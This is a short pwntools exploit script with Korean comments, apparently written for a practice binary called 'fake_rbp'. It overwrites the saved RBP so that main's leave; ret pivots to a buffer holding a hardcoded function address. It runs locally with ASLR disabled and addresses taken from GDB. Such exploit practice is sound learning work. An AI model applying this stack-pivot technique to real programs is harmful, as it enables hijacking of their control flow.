#!/usr/bin/env python3
from pwn import *

p = process("./fake_rbp", aslr=False, env={})

# GDB에서 확인한 주소를 하드코딩
buf = 0x7FFFFFFFEAF0
vuln = 0x401156

# main의 leave; ret이 [buf]의 vuln 주소를 RIP로 사용
payload = p64(vuln)
payload += b"A" * (512 - len(payload))
payload += p64(buf - 8)

p.sendafter(b"Send payload:\n", payload)
p.interactive()
